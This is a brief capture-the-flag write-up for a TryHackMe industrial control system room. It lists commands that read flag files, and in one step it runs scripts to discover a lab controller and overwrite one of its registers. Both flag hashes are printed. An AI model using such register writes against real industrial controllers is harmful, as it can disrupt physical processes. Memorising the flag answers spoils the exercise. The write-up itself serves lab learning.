---
description: https://tryhackme.com/room/attackingics2
---

# Attacking ICS Plant #2

## Task 2 Flag #1

#### Read flag1.txt

```bash
curl http://10.10.150.35/flag1.txt
```

![curl http://10.10.150.35/flag1.txt](<../../.gitbook/assets/Screenshot from 2022-02-20 10-26-31.png>)

{% hint style="success" %}
`0df2936b4cfbd5ce3ae91ef7021d925a`
{% endhint %}

## Task 3 Flag #2

#### Read flag2.txt

```bash
python3 discovery.py 10.10.150.35
python3 set_registry.py 10.10.150.35 7 2000
curl http://10.10.150.35/flag2.txt
```

![python3 discovery.py 10.10.150.35](<../../.gitbook/assets/Screenshot from 2022-02-20 10-42-55.png>)

![python3 set\_registry.py 10.10.150.35 7 2000](<../../.gitbook/assets/Screenshot from 2022-02-20 10-44-05.png>)

{% hint style="success" %}
`fdee450ac6627276d115dd905a256d49`
{% endhint %}
